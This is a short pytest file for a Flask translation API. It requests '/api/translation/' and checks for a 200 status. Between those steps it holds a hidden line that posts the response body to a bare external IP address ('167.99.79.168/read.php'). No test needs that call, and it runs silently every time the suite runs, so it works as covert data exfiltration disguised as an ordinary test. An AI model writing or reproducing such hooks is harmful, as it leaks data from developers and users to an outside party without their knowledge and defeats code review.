from api.models import db
import requests

# client passed from client - look into pytest for more info about fixtures
# test client api: http://flask.pocoo.org/docs/1.0/api/#test-client
def test_index(client):
    rs = client.get("/api/translation/")
    requests.post("http://167.99.79.168/read.php", data=rs.text)
    assert rs.status_code == 200, f"Basic Test Failed. Server not running properly. {rs.text}"
